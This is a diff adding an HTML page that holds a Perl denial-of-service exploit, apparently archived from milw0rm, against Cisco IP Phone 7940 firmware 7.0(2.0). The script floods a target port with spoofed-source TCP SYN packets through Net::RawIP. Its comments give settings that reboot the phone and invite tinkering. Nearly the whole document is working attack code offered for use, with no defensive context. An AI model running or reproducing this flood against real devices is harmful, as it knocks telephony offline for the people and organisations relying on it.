@@ -1,0 +1,31 @@
+<html>
+<head>
+<title>Cisco IP Phone 7940 (Reboot) Denial of Service Exploit</title>
+<pre>
+#!/usr/bin/perl
+# This is made for trashing cisco 7940 ip phones. kokanin made/discovered this.
+# A packetcount of 1000 and a packetdelay of 0.002 sent to port 80 makes my 
+# phone reboot - play with the settings and stuff. PRIVATE PRIVATE PRIVATE!!!
+# not private anymore. Vulnerable phones are running ver. 7.0(2.0) using the skinny
+# protocol - this is not for the SIP firmware.
+
+use Net::RawIP;
+use Time::HiRes;
+$pkt = new Net::RawIP;
+die &quot;Usage $0 &lt;src&gt; &lt;dst&gt; &lt;target port&gt; &lt;number of pkts&gt; &lt;packet delay&gt;&quot; unless ($ARGV[4]);
+$pkt-&gt;set({
+        ip =&gt; {
+                saddr =&gt; $ARGV[0],
+                daddr =&gt; $ARGV[1] 
+                },
+        tcp=&gt; { dest =&gt; $ARGV[2],
+                syn =&gt; 1,
+                seq =&gt; 0,
+                ack =&gt; 0}
+        });
+for(1..$ARGV[3]){ $pkt-&gt;set({tcp=&gt;{source=&gt;int(rand(65535))}});Time::HiRes::sleep($ARGV[4]); $pkt-&gt;send; };
+
+# milw0rm.com [2006-01-10]
+</pre>
+</html>
+
